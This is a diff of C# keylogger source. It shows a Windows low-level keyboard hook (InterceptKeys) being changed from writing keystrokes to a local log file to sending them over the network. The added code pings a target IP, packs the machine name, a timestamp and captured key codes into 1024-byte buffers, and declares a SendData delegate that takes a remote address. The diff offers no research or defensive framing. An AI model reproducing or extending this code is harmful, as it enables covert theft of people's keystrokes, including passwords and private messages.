@@ -1,8 +1,15 @@
 ﻿using System;
-using System.IO;
+using System.Collections.Generic;
 using System.Diagnostics;
-using System.Windows.Forms;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Net.NetworkInformation;
+using System.Net.Sockets;
 using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
 
 class InterceptKeys
 {
@@ -86,31 +93,53 @@ class InterceptKeys
     return CallNextHookEx(_hookID, nCode, wParam, lParam);
   }
 
-  private static void TraceLog(StreamWriter streamWriter, string message)
-  {
-    bool debug = false;
-#if DEBUG
-    debug = true;
-    Trace.WriteLine(message);
-#endif
-    if(!debug)
-    {
-      myfileStream.WriteLine(message);
-    }
-  }
+		private static bool CheckNetwork(string ipAddress)
+		{
+			var pingSender = new Ping();
+			var pingOptions = new PingOptions()
+			{
+				DontFragment = true,
+			};
+			string data = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
+			byte[] buffer = Encoding.ASCII.GetBytes(data);
+			var pingReplay = pingSender.Send(ipAddress,
+				1200,
+				buffer,
+				pingOptions);
+			return pingReplay.Status == IPStatus.Success;
+		}
 
-  #region user32.dll import
-  [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-  private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+		private static byte[] DataToSend()
+		{
+			var pcName = $"{Environment.MachineName}-{DateTime.UtcNow}:".ToArray();
 
-  [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-  private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+			var maxVkLenght = 1024 - pcName.Length - 1;
+			var vkCodesArray = newValue.Take(maxVkLenght).Select(value => (char)value).ToArray();
+			newValue.RemoveRange(0, maxVkLenght);
+			var data = pcName.Concat(vkCodesArray).ToArray();
+			var bytesToSend = Encoding.ASCII.GetBytes(data);
+			return bytesToSend;
+		}
 
-  [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-  private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+		#region delegate
+		private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
-  [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-  private static extern IntPtr GetModuleHandle(string lpModuleName);
-  #endregion
+		private delegate void SendData(byte[] data, string ipAddress, bool forceResend = false);
+		#endregion
 
+		#region user32.dll import
+		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+		private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+
+		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+		private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+		private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
+		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+		private static extern IntPtr GetModuleHandle(string lpModuleName);
+		#endregion
+
+	}
 }
